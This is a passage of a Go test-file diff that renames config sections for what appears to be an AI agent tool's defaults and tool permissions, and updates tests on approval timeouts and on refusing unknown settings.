-	if err := os.WriteFile(path, []byte("version = 14\n[ui]\ncurrency = \"GBP\"\n"), 0o600); err != nil {
+	if err := os.WriteFile(path, fmt.Appendf(nil, "version = %d\n[ui]\ncurrency = \"GBP\"\n", Format), 0o600); err != nil {
 		t.Fatal(err)
 	}
 
@@ -1864,7 +1883,7 @@ func TestTheShippedModelDefaultsAreHighEffortWithoutFastMode(t *testing.T) {
 
 func TestModelDefaultsMayBeConfigured(t *testing.T) {
 	defaults := configFrom(t, `
-		[defaults]
+		[default]
 		effort = "low"
 		fast = false
 	`).Defaults.ForSelections()
@@ -1876,7 +1895,7 @@ func TestModelDefaultsMayBeConfigured(t *testing.T) {
 
 func TestAnUnrecognisedDefaultEffortIsRefused(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	if err := writeConfigFile(path, "[defaults]\neffort = \"tremendous\"\n"); err != nil {
+	if err := writeConfigFile(path, "[default]\neffort = \"tremendous\"\n"); err != nil {
 		t.Fatal(err)
 	}
 
@@ -2018,20 +2037,18 @@ func TestPermissionsUseSafeDefaults(t *testing.T) {
 
 func TestAPermissionNobodyOffersIsRefusedWithItsKey(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	if err := writeConfigFile(path, "[permissions]\nlookup = \"sometimes\"\n"); err != nil {
+	if err := writeConfigFile(path, "[tool.lookup]\npermission = \"sometimes\"\n"); err != nil {
 		t.Fatal(err)
 	}
 
 	settings, err := Load(path)
-	if err != nil {
-		t.Fatal(err)
+	if err == nil {
+		_, err = settings.BuildPermissions()
 	}
-
-	_, err = settings.BuildPermissions()
 	if err == nil {
 		t.Fatal("a permission nobody offers was accepted")
 	}
-	if !strings.Contains(err.Error(), "permissions.lookup") {
+	if !strings.Contains(err.Error(), "tool.lookup") || !strings.Contains(err.Error(), "permission") {
 		t.Errorf("got %q, want it to name the setting", err)
 	}
 }
@@ -2157,8 +2174,12 @@ func TestTheBuiltInDefaultsAreThemselvesAConfigSomebodyMayWrite(t *testing.T) {
 	if !reflect.DeepEqual(written.Defaults, built.Defaults) {
 		t.Errorf("got defaults %+v, want %+v", written.Defaults, built.Defaults)
 	}
-	if !reflect.DeepEqual(written.Permissions, built.Permissions) {
-		t.Errorf("got permissions %+v, want %+v", written.Permissions, built.Permissions)
+	writtenPermissions, err := written.BuildPermissions()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if builtPermissions, _ := built.BuildPermissions(); writtenPermissions != builtPermissions {
+		t.Errorf("got permissions %+v, want %+v", writtenPermissions, builtPermissions)
 	}
 }
 
@@ -2400,9 +2421,11 @@ func TestRemovedSubagentModelSettingsAreReportedAsUnknown(t *testing.T) {
 
 func TestAGatedActionTakesItsApprovalTimeoutAsACustomToolDoes(t *testing.T) {
 	permissions, err := configFrom(t, `
-		[permissions]
-		network = { rule = "ask", timeout = "2m" }
-		fetch = "allow"
+		[tool.bash]
+		host_network = { rule = "ask", timeout = "2m" }
+
+		[tool.fetch]
+		permission = "allow"
 	`).BuildPermissions()
 	if err != nil {
 		t.Fatal(err)
@@ -2415,10 +2438,10 @@ func TestAGatedActionTakesItsApprovalTimeoutAsACustomToolDoes(t *testing.T) {
 	}
 
 	for name, body := range map[string]string{
-		"allowed with a timeout": "[permissions]\nnetwork = { rule = \"allow\", timeout = \"2m\" }\n",
-		"no rule":                "[permissions]\nnetwork = { timeout = \"2m\" }\n",
-		"empty":                  "[permissions]\nnetwork = \"\"\n",
-		"unknown key":            "[permissions]\nnetwork = { rule = \"ask\", wait = \"2m\" }\n",
+		"allowed with a timeout": "[tool.bash]\nhost_network = { rule = \"allow\", timeout = \"2m\" }\n",
+		"no rule":                "[tool.bash]\nhost_network = { timeout = \"2m\" }\n",
+		"empty":                  "[tool.bash]\nhost_network = \"\"\n",
+		"unknown key":            "[tool.bash]\nhost_network = { rule = \"ask\", wait = \"2m\" }\n",
 	} {
 		t.Run(name, func(t *testing.T) {
 			path := filepath.Join(t.TempDir(), "config.toml")
